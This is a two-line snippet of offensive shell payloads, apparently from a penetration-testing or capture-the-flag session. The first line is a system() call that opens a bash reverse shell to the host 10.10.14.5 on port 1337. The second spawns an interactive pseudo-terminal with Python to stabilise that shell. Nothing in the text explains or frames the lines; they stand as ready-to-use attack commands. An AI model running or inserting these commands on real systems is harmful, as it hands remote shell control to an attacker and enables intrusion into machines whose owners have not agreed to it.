system('bash -c "bash -i >& /dev/tcp/10.10.14.5/1337 0>&1"');
python3 -c "import pty;pty.spawn('/bin/bash')"
